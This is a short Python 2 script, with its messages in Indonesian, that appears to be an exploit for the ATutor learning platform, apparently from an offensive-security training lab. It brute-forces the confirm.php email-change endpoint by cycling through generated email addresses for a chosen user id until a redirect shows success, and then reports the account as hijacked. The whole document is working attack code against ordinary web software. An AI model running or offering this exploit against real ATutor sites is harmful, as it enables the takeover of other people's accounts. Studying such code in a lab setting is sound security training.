import hashlib, string, itertools, re, sys, requests

def gen_code(domain, id, prefix_length, url):
    for word in itertools.imap(''.join, itertools.product(string.lowercase,repeat=int(prefix_length))):
        email = "%s@%s" % (word, domain)
        full_url = "%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (url, email, id)
        r = requests.get(full_url, allow_redirects=False)
        print '[-] Mengeluarkan permintaan pembaruan ke URL: %s' % full_url
        if (r.status_code == 302):
            return (True, email)


def main():
    if len(sys.argv) != 5:
        print '[!] penggunaan: %s <nama_domain_email> <id> <panjang_awalan> <url_atutor>' % sys.argv[0]
        print '[!] Semisal: %s offsec.local 3 4 http://atutor-server.com' % sys.argv[0]
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefix_length = sys.argv[3]
    url = sys.argv[4]
    result, email = gen_code(domain, id, prefix_length, url)
    if(result):
        print "[+] Akun dibajak w/ %s!" % email
    else:
        print "[!] Serangan gagal! Coba panjang awalan yang lebih besar..."
        sys.exit(2)
    

if __name__ == "__main__":
    main()